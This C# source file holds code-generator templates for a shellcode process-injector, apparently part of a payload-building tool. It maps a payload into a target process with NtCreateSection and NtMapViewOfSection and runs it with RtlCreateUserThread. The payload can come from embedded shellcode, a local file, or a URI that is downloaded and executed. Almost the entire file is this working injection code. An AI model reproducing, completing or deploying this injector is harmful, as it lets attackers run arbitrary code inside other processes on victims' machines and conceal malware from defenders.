class NtCreateSection_NtMapViewOfSection
{
    public static string STATICMODE = @"
        Process target = Process.GetProcessById( {{PROCESSID}} );
        System.Collections.Generic.List<byte> payloadList = new System.Collections.Generic.List<byte>();
        {{SHELLCODE}}
        byte[] payload = payloadList.ToArray();
            ";
    public static string DYNAMICMODE = @"
        if (args.Contains(""-h"", StringComparer.OrdinalIgnoreCase) || !args.Contains(""-pid"", StringComparer.OrdinalIgnoreCase) || !args.Contains(""-bin"", StringComparer.OrdinalIgnoreCase)) {
            Console.WriteLine(""-pid: Process ID of target process \n-bin: Path to shellcode"");
            Environment.Exit(0);
        }
        ArgValues parsedArgs = ArgParse(args);
        Process target = parsedArgs.Pid; 
        byte[] payload = System.IO.File.ReadAllBytes(parsedArgs.binPath);
        ";

    public static string DOWNLOADMODE = @"
        if (args.Contains(""-h"", StringComparer.OrdinalIgnoreCase) || !args.Contains(""-pid"", StringComparer.OrdinalIgnoreCase) || !args.Contains(""-uri"", StringComparer.OrdinalIgnoreCase)) {
            Console.WriteLine(""-PID: Absolute filepath used to spawn process \n-URI: URI to download"");
            Environment.Exit(0);
        }
        ArgValues parsedArgs = ArgParse(args);
        Process target = parsedArgs.Pid;
        System.Net.WebClient wc = new System.Net.WebClient();
        byte[] payload;
        payload = wc.DownloadData(parsedArgs.DownloadURI);
            
        if (payload.Length == 0)
        {
            Console.WriteLine(""[!] Error downloading"");
        }
        ";
    public static string DYNAMICARGPARSE = @"
        public class ArgValues
        {
            public Process Pid;
            public string binPath;
        }

        static ArgValues ArgParse(string[] arguments)
        {
            ArgValues collection = new ArgValues();

            if (arguments.Count() != 0)
            {
                for (var i = 0; i < arguments.Count(); i++)
                {
                    if (arguments[i].ToUpper().StartsWith(""-PID"") && arguments[i + 1] != null)
                    {
                        try 
                        {
                            collection.Pid = Process.GetProcessById(Int32.Parse(arguments[i+1]));
                        }
                        catch
                        {
                            Console.WriteLine(""[!] PID Error"");
                        }
                    }

                    if (arguments[i].ToUpper().StartsWith(""-BIN"") && arguments[i + 1] != null)
                    {
                        if (System.IO.File.Exists(arguments[i + 1]))
                        {
                            collection.binPath = arguments[i + 1];
                        }
                        else if (!System.IO.File.Exists(arguments[i + 1]))
                        {
                            Console.WriteLine(""[!] Invalid bin path supplied."");
                            Environment.Exit(1);
                        }
                    }
                }
            }
            else
            {
                Console.WriteLine(""[!] No args specified"");
            }

            return collection;
        }";
    public static string DOWNLOADARGPARSE = @"
        public class ArgValues
        {
            public Process Pid;
            public string DownloadURI;
        }

        static ArgValues ArgParse(string[] arguments)
        {
            ArgValues collection = new ArgValues();

            if (arguments.Count() != 0)
            {
                for (var i = 0; i < arguments.Count(); i++)
                {
                    if (arguments[i].ToUpper().StartsWith(""-PID"") && arguments[i + 1] != null)
                    {
                        try 
                        {
                            collection.Pid = Process.GetProcessById(Int32.Parse(arguments[i+1]));
                        }
                        catch
                        {
                            Console.WriteLine(""[!] PID Error"");
                        }
                    }

                    if (arguments[i].ToUpper().StartsWith(""-URI"") && arguments[i + 1] != null)
                    {
                        collection.DownloadURI = arguments[i + 1];
                    }
                }
            }
            else
            {
                Console.WriteLine(""[!] No args specified"");
            }
            return collection;
        }";
    public static string BODY = @"using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;

namespace {{NAMESPACE}}
{
    internal class Program
    {
        static void Main(string[] args)
        {
            {{TRIGGER}}
            {{MODE}}

            uint dwRet = 0;
            uint dwMaxSize = (uint)payload.Length;
            ulong ulGarbage = 0;
            IntPtr hSection = IntPtr.Zero;
            IntPtr hLocalSectionAddress = IntPtr.Zero;
            IntPtr hRemoteSectionAddress = IntPtr.Zero;

            dwRet = NtCreateSection( 
                ref hSection,
                SECTION_ALL_ACCESS,
                IntPtr.Zero,
                ref dwMaxSize,
                0x40,/*RWX*/
                SEC_COMMIT,
                IntPtr.Zero);
            
            if (dwRet != 0)
            {
                Console.WriteLine(""[!] NtCreateSection failed. Exiting..."");
                Environment.Exit(0);
            }
            
            dwRet = NtMapViewOfSection(
                hSection,
                Process.GetCurrentProcess().Handle,
                ref hLocalSectionAddress,
                UIntPtr.Zero,
                UIntPtr.Zero,
                out ulGarbage,
                out dwMaxSize,
                2,
                0,
                0x40);/*RWX*/

            if (dwRet != 0)
            {
                Console.WriteLine(""[!] NtMapViewOfSection for the local section failed. Exiting..."");
                Environment.Exit(0);
            }

            dwRet = NtMapViewOfSection(
                hSection,
                target.Handle,
                ref hRemoteSectionAddress,
                UIntPtr.Zero,
                UIntPtr.Zero,
                out ulGarbage,
                out dwMaxSize,
                2,
                0,
                0x20);/*RX*/

            if (dwRet != 0)
            {
                Console.WriteLine(""[!] NtMapViewOfSection for the remote section failed. Exiting..."");
                Environment.Exit(0);
            }

            Marshal.Copy(payload, 0, hLocalSectionAddress, payload.Length);
            
            IntPtr hTargetThread = IntPtr.Zero;
            RtlCreateUserThread(
                target.Handle,
                IntPtr.Zero,
                false,
                0,
                IntPtr.Zero,
                IntPtr.Zero,
                hRemoteSectionAddress,
                IntPtr.Zero,
                ref hTargetThread,
                IntPtr.Zero);

            if (hTargetThread == IntPtr.Zero)
            {
                Console.WriteLine(""[!] RtlCreateUserThread failed. Exiting..."");
                Environment.Exit(0);
            }
        }
        {{ARGS}}

        private static uint SEC_COMMIT = 0x08000000;
        private static uint SECTION_MAP_WRITE = 0x0002;
        private static uint SECTION_MAP_READ = 0x0004;
        private static uint SECTION_MAP_EXECUTE = 0x0008;
        private static uint SECTION_ALL_ACCESS = SECTION_MAP_WRITE | SECTION_MAP_READ | SECTION_MAP_EXECUTE;

        {{PINVOKE}}
    }
}
";
}

